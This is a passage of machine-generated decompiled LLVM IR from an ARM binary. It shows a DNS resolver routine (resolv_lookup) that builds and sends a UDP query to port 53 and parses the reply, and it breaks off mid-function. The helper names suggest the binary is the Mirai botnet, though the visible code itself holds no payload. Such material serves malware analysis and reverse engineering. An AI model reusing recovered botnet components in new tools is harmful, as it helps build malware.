  %v1_e2e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_e2e8 = inttoptr i32 %v1_e2e8 to i32*
  store i32 %v0_e2e8, i32* %v2_e2e8, align 4
  br label %dec_label_pc_e2d4

; uselistorder directives
  uselistorder i32 %v9_e28c, { 1, 0 }
  uselistorder i32 %v12_e288, { 1, 0 }
  uselistorder i32 %v5_e284, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e2b0, { 1, 0 }
  uselistorder i32 %v0_e2b4, { 1, 0 }
  uselistorder i32 %v0_e2a0, { 1, 0, 2 }
  uselistorder i32 %v0_e25c, { 1, 0 }
  uselistorder i32 %v0_e224, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_21f40.119, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_21f40.119 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_21f44.123, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_21f48.125, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_21f4c.121, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e2d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e274, { 1, 0 }
}

define i32 @resolv_entries_free(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e300 = load i32, i32* @r4, align 4
  store i32 %v3_e300, i32* %stack_var_-8, align 4
  %v6_e300 = load i32, i32* @lr, align 4
  %v0_e304 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e304, i32* @r4, align 4
  %v2_e304 = icmp eq i32 %v0_e304, 0
  br i1 %v2_e304, label %dec_label_pc_e320, label %dec_label_pc_e30c

dec_label_pc_e30c:                                ; preds = %entry
  %v1_e30c = add i32 %v0_e304, 4
  %v2_e30c = inttoptr i32 %v1_e30c to i32*
  %v3_e30c = load i32, i32* %v2_e30c, align 4
  store i32 %v3_e30c, i32* %r0.global-to-local, align 4
  store i32 58136, i32* @lr, align 4
  %v1_e314 = icmp ne i32 %v3_e30c, 0
  call void @__pseudo_cond_branch(i1 %v1_e314, i32 ptrtoint (i32* @global_var_1310c.34 to i32))
  %v0_e318 = load i32, i32* @r4, align 4
  store i32 %v0_e318, i32* @r0, align 4
  %v0_e31c = call i32 @free()
  store i32 %v0_e31c, i32* %r0.global-to-local, align 4
  %v2_e320.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e320

dec_label_pc_e320:                                ; preds = %entry, %dec_label_pc_e30c
  %v1_e324 = phi i32 [ 0, %entry ], [ %v0_e31c, %dec_label_pc_e30c ]
  %v2_e320 = phi i32 [ %v3_e300, %entry ], [ %v2_e320.pre, %dec_label_pc_e30c ]
  store i32 %v2_e320, i32* @r4, align 4
  store i32 %v6_e300, i32* @lr, align 4
  ret i32 %v1_e324

; uselistorder directives
  uselistorder i32 %v0_e304, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_e320, { 1, 0 }
}

define i32 @resolv_lookup(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp79 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-4280 = alloca i32, align 4
  %stack_var_-4292 = alloca i16, align 2
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2230 = alloca i32, align 4
  %stack_var_-2244 = alloca i16, align 2
  %stack_var_-2232 = alloca i32, align 4
  %v3_e328 = load i32, i32* @r4, align 4
  %v9_e328 = load i32, i32* @r6, align 4
  %v12_e328 = load i32, i32* @r7, align 4
  %v15_e328 = load i32, i32* @r8, align 4
  %v18_e328 = load i32, i32* @sb, align 4
  %v21_e328 = load i32, i32* @sl, align 4
  %v24_e328 = load i32, i32* @fp, align 4
  %v27_e328 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_e340 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_e340, i32* @fp, align 4
  %v0_e348 = load i32, i32* @r5, align 4
  store i32 %v0_e348, i32* %r0.global-to-local, align 4
  %v1_e34c = inttoptr i32 %v0_e348 to i8*
  %v2_e34c = call i32 @util_strlen(i8* %v1_e34c)
  %v2_e354 = ptrtoint i16* %stack_var_-2244 to i32
  store i32 %v2_e354, i32* @sl, align 4
  %v2_e358 = ptrtoint i32* %stack_var_-2232 to i32
  store i32 %v2_e358, i32* @sb, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_e360 = add i32 %v2_e34c, 1
  store i32 %v1_e360, i32* %r0.global-to-local, align 4
  %v2_e364 = ptrtoint i32* %stack_var_-2230 to i32
  store i32 %v2_e364, i32* %r2.global-to-local, align 4
  store i32 %v2_e358, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v1_e360, i32* %r3.global-to-local, align 4
  %v2_e3a0146 = icmp eq i32 %v1_e360, 0
  store i1 %v2_e3a0146, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v1_e3a8147 = add i32 %v2_e364, -1
  store i32 %v1_e3a8147, i32* %r1.global-to-local, align 4
  %tmp116148 = icmp slt i32 %v1_e360, 1
  br i1 %tmp116148, label %dec_label_pc_e3b0, label %dec_label_pc_e374

dec_label_pc_e374:                                ; preds = %entry, %bb115
  %v0_e374151 = phi i32 [ %v1_e394, %bb115 ], [ 0, %entry ]
  %v1_e380150.off0 = phi i8 [ %extract.t152, %bb115 ], [ 0, %entry ]
  %v2_e3b4149 = phi i32 [ %v1_e398, %bb115 ], [ %v2_e364, %entry ]
  %v1_e374 = load i32, i32* @r5, align 4
  %v2_e374 = add i32 %v1_e374, %v0_e374151
  %v3_e374 = inttoptr i32 %v2_e374 to i8*
  %v4_e374 = load i8, i8* %v3_e374, align 1
  %v6_e374 = zext i8 %v4_e374 to i32
  store i32 %v6_e374, i32* %r3.global-to-local, align 4
  %v2_e378 = icmp eq i8 %v4_e374, 0
  store i1 %v2_e378, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e378, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e374
  %v8_e37c = icmp eq i8 %v4_e374, 46
  store i1 %v8_e37c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e37c, label %.thread, label %.thread7

.thread:                                          ; preds = %dec_label_pc_e374, %bb
  %v3_e380 = load i32, i32* %r6.global-to-local, align 4
  %v4_e380 = inttoptr i32 %v3_e380 to i8*
  store i8 %v1_e380150.off0, i8* %v4_e380, align 1
  %v0_e384.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e384.pr, label %.thread9.thread13, label %.thread..thread7_crit_edge

.thread..thread7_crit_edge:                       ; preds = %.thread
  %v1_e384.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_e384.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_e384.pre to i8
  br label %.thread7

.thread7:                                         ; preds = %.thread..thread7_crit_edge, %bb
  %v3_e384 = phi i32 [ %v3_e384.pre, %.thread..thread7_crit_edge ], [ %v2_e3b4149, %bb ]
  %v1_e384.off0 = phi i8 [ %extract.t, %.thread..thread7_crit_edge ], [ %v4_e374, %bb ]
  %v4_e384 = add i32 %v3_e384, -1
  %v5_e384 = inttoptr i32 %v4_e384 to i8*
  store i8 %v1_e384.off0, i8* %v5_e384, align 1
  %v0_e388.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e388.pr, label %.thread9, label %.thread12

.thread9.thread13:                                ; preds = %.thread
  %v1_e388 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e388, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread9:                                         ; preds = %.thread7
  %v1_e38811 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e38811, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread12:                                        ; preds = %.thread7
  %v1_e390 = load i32, i32* @lr, align 4
  %v2_e390 = urem i32 %v1_e390, 256
  store i32 %v2_e390, i32* %r4.global-to-local, align 4
  br label %bb115

bb115:                                            ; preds = %.thread9, %.thread9.thread13, %.thread12
  %v0_e3a433 = phi i32 [ 0, %.thread9.thread13 ], [ 0, %.thread9 ], [ %v2_e390, %.thread12 ]
  %v0_e394 = load i32, i32* %ip.global-to-local, align 4
  %v1_e394 = add i32 %v0_e394, 1
  store i32 %v1_e394, i32* %ip.global-to-local, align 4
  %v0_e398 = load i32, i32* %r2.global-to-local, align 4
  %v1_e398 = add i32 %v0_e398, 1
  store i32 %v1_e398, i32* %r2.global-to-local, align 4
  %v1_e39c.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_e39c = sub i32 %v1_e39c.pre, %v1_e394
  store i32 %v2_e39c, i32* %r3.global-to-local, align 4
  %v2_e3a0 = icmp eq i32 %v2_e39c, 0
  store i1 %v2_e3a0, i1* %cpsr_z.global-to-local, align 1
  %v1_e3a4 = add nuw nsw i32 %v0_e3a433, 1
  store i32 %v1_e3a4, i32* @lr, align 4
  store i32 %v0_e398, i32* %r1.global-to-local, align 4
  %tmp116 = icmp slt i32 %v2_e39c, 1
  %extract.t152 = trunc i32 %v0_e3a433 to i8
  br i1 %tmp116, label %dec_label_pc_e3b0, label %dec_label_pc_e374

dec_label_pc_e3b0:                                ; preds = %bb115, %entry
  %v1_e3a8.lcssa = phi i32 [ %v1_e3a8147, %entry ], [ %v0_e398, %bb115 ]
  store i32 0, i32* @r4, align 4
  %v4_e3b4 = inttoptr i32 %v1_e3a8.lcssa to i8*
  store i8 0, i8* %v4_e3b4, align 1
  store i32 %v2_e358, i32* %r0.global-to-local, align 4
  %v1_e3bc = bitcast i32* %stack_var_-2232 to i8*
  %v2_e3bc = call i32 @util_strlen(i8* %v1_e3bc)
  %v2_e3c0 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_e3c0, i32* %r1.global-to-local, align 4
  %v1_e3c4 = load i32, i32* @sb, align 4
  %v2_e3c4 = add i32 %v1_e3c4, %v2_e3bc
  store i32 %v2_e3c4, i32* @r5, align 4
  %v0_e3cc = load i32, i32* @r4, align 4
  store i32 %v0_e3cc, i32* %stack_var_-68, align 4
  store i32 %v2_e358, i32* %r0.global-to-local, align 4
  %v2_e3dc = call i32 @util_strlen(i8* %v1_e3bc)
  %v1_e3e0 = add i32 %v2_e3dc, 17
  store i32 %v1_e3e0, i32* %r0.global-to-local, align 4
  %v0_e3e8 = call i32 @rand_next()
  %v1_e3e8 = sext i32 %v0_e3e8 to i64
  store i32 -2147450879, i32* %r3.global-to-local, align 4
  %v5_e3f4 = mul nuw nsw i64 %v1_e3e8, 2147516417
  %v6_e3f4 = udiv i64 %v5_e3f4, 4294967296
  %v7_e3f4 = trunc i64 %v6_e3f4 to i32
  %v8_e3f4 = trunc i64 %v5_e3f4 to i32
  store i32 %v8_e3f4, i32* @lr, align 4
  store i32 %v7_e3f4, i32* %r2.global-to-local, align 4
  %v5_e3f84 = udiv i64 %v5_e3f4, 140737488355328
  %v5_e3f8 = trunc i64 %v5_e3f84 to i32
  %v6_e3f8 = add i32 %v5_e3f8, %v0_e3e8
  store i32 16, i32* @r1, align 4
  %v6_e404 = urem i32 %v6_e3f8, 65536
  store i32 %v6_e404, i32* %ip.global-to-local, align 4
  %v2_e40c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_e40c, i32* @r0, align 4
  %v5_e410 = trunc i32 %v6_e3f8 to i16
  %v0_e414 = call i32 @util_zero()
  store i32 %v0_e414, i32* %r0.global-to-local, align 4
  store i32 13568, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  %v0_e444 = load i32, i32* @r5, align 4
  %v1_e444 = add i32 %v0_e444, 1
  store i32 %v1_e444, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i16 %v5_e410, i16* %stack_var_-2244, align 2
  %v4_e458 = inttoptr i32 %v1_e444 to i16*
  store i16 256, i16* %v4_e458, align 2
  %v0_e45c = load i32, i32* %r3.global-to-local, align 4
  %v1_e45c = trunc i32 %v0_e45c to i16
  %v2_e45c = load i32, i32* %r2.global-to-local, align 4
  %v3_e45c = add i32 %v2_e45c, 2
  %v4_e45c = inttoptr i32 %v3_e45c to i16*
  store i16 %v1_e45c, i16* %v4_e45c, align 2
  store i32 -1, i32* %r6.global-to-local, align 4
  %v2_e4f4 = ptrtoint i32* %stack_var_-196 to i32
  %v2_e51c = ptrtoint i32* %stack_var_-40 to i32
  %v2_e548 = ptrtoint i32* %stack_var_-52 to i32
  %v2_e58c = ptrtoint i16* %stack_var_-4292 to i32
  %v2_e620 = ptrtoint i32* %stack_var_-4280 to i32
  %v1_e628 = bitcast i32* %stack_var_-4280 to i8*
  %v4_e64c = zext i16 %tmp79 to i32
  %v2_e650 = icmp eq i16 %tmp79, 0
  br label %dec_label_pc_e468

dec_label_pc_e468:                                ; preds = %dec_label_pc_e5d4, %dec_label_pc_e3b0
  %v1_e46c = phi i32 [ -1, %dec_label_pc_e3b0 ], [ %v0_e468.pre, %dec_label_pc_e5d4 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_e3b0 ], [ %v1_e5d4, %dec_label_pc_e5d4 ]
  store i32 %storemerge, i32* @r8, align 4
  %v7_e468 = icmp eq i32 %v1_e46c, -1
  store i1 %v7_e468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e468, label %bb118, label %bb117

bb117:                                            ; preds = %dec_label_pc_e468
  store i32 %v1_e46c, i32* %r0.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %dec_label_pc_e468, %bb117
  store i32 58484, i32* @lr, align 4
  %v1_e470 = xor i1 %v7_e468, true
  call void @__pseudo_cond_branch(i1 %v1_e470, i32 ptrtoint (i32* @global_var_145e0.112 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* @r1, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e480 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v3_e480, i32* %r0.global-to-local, align 4
  %v7_e484 = icmp eq i32 %v3_e480, -1
  store i1 %v7_e484, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e480, i32* @r6, align 4
  br i1 %v7_e484, label %dec_label_pc_e614, label %dec_label_pc_e490

dec_label_pc_e490:                                ; preds = %bb118
  store i32 %v2_e40c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e49c = call i32 @__libc_connect(i32 %v3_e480, i32 %v2_e40c, i32 16)
  store i32 %v3_e49c, i32* %r0.global-to-local, align 4
  %v7_e4a0 = icmp eq i32 %v3_e49c, -1
  store i1 %v7_e4a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e4a0, label %dec_label_pc_e5dc, label %dec_label_pc_e4a8

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e490
  %v0_e4a8 = load i32, i32* @r6, align 4
  store i32 %v0_e4a8, i32* %r0.global-to-local, align 4
  store i32 %v2_e354, i32* %r1.global-to-local, align 4
  store i32 %v1_e3e0, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e4b8 = call i32 @__libc_send(i32 %v0_e4a8, i32 %v2_e354, i32 %v1_e3e0, i32 16384)
  store i32 %v4_e4b8, i32* %r0.global-to-local, align 4
  %v7_e4bc = icmp eq i32 %v4_e4b8, -1
  store i1 %v7_e4bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e4bc, label %dec_label_pc_e5dc, label %dec_label_pc_e4c4

dec_label_pc_e4c4:                                ; preds = %dec_label_pc_e4a8
  %v0_e4c4 = load i32, i32* @r6, align 4
  store i32 %v0_e4c4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_e4d0 = call i32 @__libc_fcntl(i32 3, i32 %v0_e4c4)
  %v0_e4d4 = load i32, i32* @r6, align 4
  store i32 %v0_e4d4, i32* %r1.global-to-local, align 4
  %v1_e4d8 = or i32 %v2_e4d0, 2048
  store i32 %v1_e4d8, i32* @r2, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_e4e0 = call i32 @__libc_fcntl(i32 4, i32 %v0_e4d4)
  store i32 %v2_e4e0, i32* %r0.global-to-local, align 4
  store i32 %v2_e3c0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %v2_e4f4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e4fc

dec_label_pc_e4fc:                                ; preds = %dec_label_pc_e4fc, %dec_label_pc_e4c4
  %v1_e500 = phi i32 [ %v1_e504, %dec_label_pc_e4fc ], [ 4, %dec_label_pc_e4c4 ]
  store i32 0, i32* @r4, align 4
  %v3_e500 = add i32 %v1_e500, %v2_e4f4
  %v4_e500 = inttoptr i32 %v3_e500 to i32*
  store i32 0, i32* %v4_e500, align 4
  %v0_e504 = load i32, i32* %r3.global-to-local, align 4
  %v1_e504 = add i32 %v0_e504, 4
  store i32 %v1_e504, i32* %r3.global-to-local, align 4
  %v7_e508 = icmp eq i32 %v1_e504, 128
  br i1 %v7_e508, label %dec_label_pc_e510, label %dec_label_pc_e4fc

dec_label_pc_e510:                                ; preds = %dec_label_pc_e4fc
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_e510 = load i32, i32* @r6, align 4
  %v3_e510 = udiv i32 %v0_e510, 32
  %v3_e518 = mul nuw nsw i32 %v3_e510, 4
  store i32 %v3_e518, i32* %r3.global-to-local, align 4
  %v2_e520 = add i32 %v3_e518, %v2_e51c
  store i32 %v2_e520, i32* @r5, align 4
  %v1_e524 = add i32 %v2_e520, -156
  %v2_e524 = inttoptr i32 %v1_e524 to i32*
  %v3_e524 = load i32, i32* %v2_e524, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_e52c = urem i32 %v0_e510, 32
  store i32 %v1_e52c, i32* @r7, align 4
  %v7_e530 = shl i32 1, %v1_e52c
  %v8_e530 = or i32 %v3_e524, %v7_e530
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_e530, i32* %v2_e524, align 4
  %v0_e540 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_e540, i32* %stack_var_-52, align 4
  store i32 %v2_e548, i32* @lr, align 4
  store i32 %v2_e3c0, i32* %ip.global-to-local, align 4
  %v0_e550 = load i32, i32* @r6, align 4
  %v1_e550 = load i32, i32* %r3.global-to-local, align 4
  %v2_e550 = add i32 %v1_e550, %v0_e550
  store i32 %v2_e550, i32* %r0.global-to-local, align 4
  %v0_e558 = load i32, i32* @r4, align 4
  store i32 %v0_e558, i32* %r2.global-to-local, align 4
  store i32 %v0_e558, i32* %r3.global-to-local, align 4
  %v5_e564 = call i32 @__libc_select(i32 %v2_e550, i32 %v2_e4f4, i32 %v0_e558, i32 %v0_e558, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_e564, i32* %r0.global-to-local, align 4
  %v7_e568 = icmp eq i32 %v5_e564, -1
  store i1 %v7_e568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e568, label %dec_label_pc_e5ec, label %dec_label_pc_e570

dec_label_pc_e570:                                ; preds = %dec_label_pc_e510
  %v1_e570 = load i32, i32* @r4, align 4
  %v9_e570 = icmp eq i32 %v5_e564, %v1_e570
  store i1 %v9_e570, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e570, label %dec_label_pc_e5cc, label %dec_label_pc_e578

dec_label_pc_e578:                                ; preds = %dec_label_pc_e570
  %v0_e578 = load i32, i32* @r5, align 4
  %v1_e578 = add i32 %v0_e578, -156
  %v2_e578 = inttoptr i32 %v1_e578 to i32*
  %v3_e578 = load i32, i32* %v2_e578, align 4
  %v1_e57c = load i32, i32* @r7, align 4
  %v6_e57c = ashr i32 %v3_e578, %v1_e57c
  store i32 %v6_e57c, i32* %r3.global-to-local, align 4
  %v1_e580 = urem i32 %v6_e57c, 2
  %v2_e580 = icmp eq i32 %v1_e580, 0
  store i1 %v2_e580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e580, label %dec_label_pc_e5ec, label %dec_label_pc_e588

dec_label_pc_e588:                                ; preds = %dec_label_pc_e578
  store i32 %v2_e58c, i32* @r5, align 4
  store i32 %v2_e58c, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e59c = load i32, i32* @r6, align 4
  store i32 %v0_e59c, i32* %r0.global-to-local, align 4
  %v6_e5a8 = call i32 @__libc_recvfrom(i32 %v0_e59c, i32 %v2_e58c, i32 2048, i32 16384, i32 %v1_e570, i32 %v1_e570)
  store i32 %v6_e5a8, i32* %r4.global-to-local, align 4
  %v0_e5b0 = load i32, i32* @sb, align 4
  store i32 %v0_e5b0, i32* %r0.global-to-local, align 4
  %v1_e5b4 = inttoptr i32 %v0_e5b0 to i8*
  %v2_e5b4 = call i32 @util_strlen(i8* %v1_e5b4)
  %v1_e5b8 = add i32 %v2_e5b4, 17
  store i32 %v1_e5b8, i32* %r0.global-to-local, align 4
  %v0_e5bc = load i32, i32* %r4.global-to-local, align 4
  %v3_e5bc = icmp ult i32 %v0_e5bc, %v1_e5b8
  %v9_e5bc = icmp eq i32 %v0_e5bc, %v1_e5b8
  store i1 %v9_e5bc, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_e5bc, label %dec_label_pc_e5cc, label %dec_label_pc_e620

dec_label_pc_e5cc:                                ; preds = %dec_label_pc_e588, %dec_label_pc_e620, %dec_label_pc_e64c, %dec_label_pc_e570, %dec_label_pc_e614
  %v0_e5cc = load i32, i32* @r8, align 4
  %v7_e5cc = icmp eq i32 %v0_e5cc, 5
  store i1 %v7_e5cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e5cc, label %dec_label_pc_e5ec, label %dec_label_pc_e5d4

dec_label_pc_e5d4:                                ; preds = %dec_label_pc_e5dc, %dec_label_pc_e5cc
  %v0_e5d4 = phi i32 [ %v0_e5e4, %dec_label_pc_e5dc ], [ %v0_e5cc, %dec_label_pc_e5cc ]
  %v1_e5d4 = add i32 %v0_e5d4, 1
  %v0_e468.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e468

dec_label_pc_e5dc:                                ; preds = %dec_label_pc_e4a8, %dec_label_pc_e490
  %v0_e5dc = phi i32 [ %v4_e4b8, %dec_label_pc_e4a8 ], [ %v3_e49c, %dec_label_pc_e490 ]
  %v1_e5dc = add i32 %v0_e5dc, 2
  store i32 %v1_e5dc, i32* %r0.global-to-local, align 4
  %v1_e5e0 = call i32 @sleep(i32 %v1_e5dc)
  store i32 %v1_e5e0, i32* %r0.global-to-local, align 4
  %v0_e5e4 = load i32, i32* @r8, align 4
  %v7_e5e4 = icmp eq i32 %v0_e5e4, 5
  store i1 %v7_e5e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e5e4, label %dec_label_pc_e5ec, label %dec_label_pc_e5d4

dec_label_pc_e5ec:                                ; preds = %dec_label_pc_e5dc, %dec_label_pc_e5cc, %dec_label_pc_e578, %dec_label_pc_e510, %dec_label_pc_e658, %dec_label_pc_e664.backedge
  %v0_e5ec = load i32, i32* @r6, align 4
  store i32 %v0_e5ec, i32* %r0.global-to-local, align 4
  %v1_e5f0 = call i32 @__GI___libc_close(i32 %v0_e5ec)
  store i32 %v1_e5f0, i32* %r0.global-to-local, align 4
  %v0_e5f4 = load i32, i32* @fp, align 4
  %v1_e5f4 = inttoptr i32 %v0_e5f4 to i8*
  %v2_e5f4 = load i8, i8* %v1_e5f4, align 1
  %v3_e5f4 = zext i8 %v2_e5f4 to i32
  store i32 %v3_e5f4, i32* @r4, align 4
  %v2_e5f8 = icmp eq i8 %v2_e5f4, 0
  store i1 %v2_e5f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e5f8, label %dec_label_pc_e73c, label %dec_label_pc_e600

dec_label_pc_e600:                                ; preds = %dec_label_pc_e5ec, %dec_label_pc_e73c
  %v0_e600 = phi i32 [ %v0_e5f4, %dec_label_pc_e5ec ], [ %v0_e750, %dec_label_pc_e73c ]
  store i32 %v0_e600, i32* %r0.global-to-local, align 4
  store i32 %v3_e328, i32* @r4, align 4
  store i32 %v9_e328, i32* @r6, align 4
  store i32 %v12_e328, i32* @r7, align 4
  store i32 %v15_e328, i32* @r8, align 4
  store i32 %v18_e328, i32* @sb, align 4
  store i32 %v21_e328, i32* @sl, align 4
  store i32 %v24_e328, i32* @fp, align 4
  store i32 %v27_e328, i32* @lr, align 4
  ret i32 %v0_e600

dec_label_pc_e614:                                ; preds = %bb118
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e618 = call i32 @sleep(i32 1)
  store i32 %v1_e618, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e5cc

dec_label_pc_e620:                                ; preds = %dec_label_pc_e588
  store i32 %v2_e620, i32* @sb, align 4
  store i32 %v2_e620, i32* %r0.global-to-local, align 4
  %v2_e628 = call i32 @util_strlen(i8* %v1_e628)
  store i32 %v2_e51c, i32* @lr, align 4
  %v4_e634 = load i16, i16* %stack_var_-4292, align 2
  %v5_e634 = sext i16 %v4_e634 to i32
  store i32 %v5_e634, i32* %r3.global-to-local, align 4
  store i32 %v6_e3f8, i32* @r1, align 4
  %v1_e63c = load i32, i32* @sb, align 4
  %v9_e640 = icmp eq i16 %v4_e634, %v5_e410
  store i1 %v9_e640, i1* %cpsr_z.global-to-local, align 1
  %v2_e63c = add i32 %v2_e628, 5
  %v1_e644 = add i32 %v2_e63c, %v1_e63c
  store i32 %v1_e644, i32* %r0.global-to-local, align 4
  br i1 %v9_e640, label %dec_label_pc_e64c, label %dec_label_pc_e5cc

dec_label_pc_e64c:                                ; preds = %dec_label_pc_e620
  store i32 %v4_e64c, i32* %r3.global-to-local, align 4
  store i1 %v2_e650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e650, label %dec_label_pc_e5cc, label %dec_label_pc_e658

dec_label_pc_e658:                                ; preds = %dec_label_pc_e64c
  %div = udiv i16 %tmp79, 256
  %v3_e658 = zext i16 %div to i32
  store i32 %v3_e658, i32* %r2.global-to-local, align 4
  %v1_e65c = mul nuw nsw i32 %v4_e64c, 256
  %v4_e660 = and i32 %v1_e65c, 65280
  %v5_e660 = or i32 %v4_e660, %v3_e658
  %v1_e664134 = add nsw i32 %v5_e660, -1
  %v3_e668135 = mul i32 %v1_e664134, 65536
  store i32 %v3_e668135, i32* %r3.global-to-local, align 4
  %v7_e66c141 = icmp eq i32 %v3_e668135, -65536
  store i1 %v7_e66c141, i1* %cpsr_z.global-to-local, align 1
  %v3_e670142 = urem i32 %v1_e664134, 65536
  store i32 %v3_e670142, i32* @r8, align 4
  br i1 %v7_e66c141, label %dec_label_pc_e5ec, label %dec_label_pc_e678

dec_label_pc_e678:                                ; preds = %dec_label_pc_e658, %dec_label_pc_e664.backedge
  %v3_e670144 = phi i32 [ %v3_e670, %dec_label_pc_e664.backedge ], [ %v3_e670142, %dec_label_pc_e658 ]
  %v0_e6c8143 = phi i32 [ %storemerge29, %dec_label_pc_e664.backedge ], [ %v1_e644, %dec_label_pc_e658 ]
  store i32 %v0_e6c8143, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_e68418 = inttoptr i32 %v0_e6c8143 to i8*
  %v2_e68419 = load i8, i8* %v1_e68418, align 1
  %v3_e68420 = zext i8 %v2_e68419 to i32
  store i32 %v3_e68420, i32* %r2.global-to-local, align 4
  %v2_e68821 = icmp eq i8 %v2_e68419, 0
  store i1 %v2_e68821, i1* %cpsr_z.global-to-local, align 1
  %v3_e68c22 = mul nuw nsw i32 %v3_e68420, 256
  store i32 %v3_e68c22, i32* @r1, align 4
  br i1 %v2_e68821, label %dec_label_pc_e6c0, label %dec_label_pc_e694.preheader

dec_label_pc_e694.preheader:                      ; preds = %dec_label_pc_e678, %dec_label_pc_e684.backedge
  %v1_e760 = phi i32 [ %v1_e76050, %dec_label_pc_e684.backedge ], [ 1, %dec_label_pc_e678 ]
  %v0_e75848 = phi i32 [ %v0_e758, %dec_label_pc_e684.backedge ], [ 0, %dec_label_pc_e678 ]
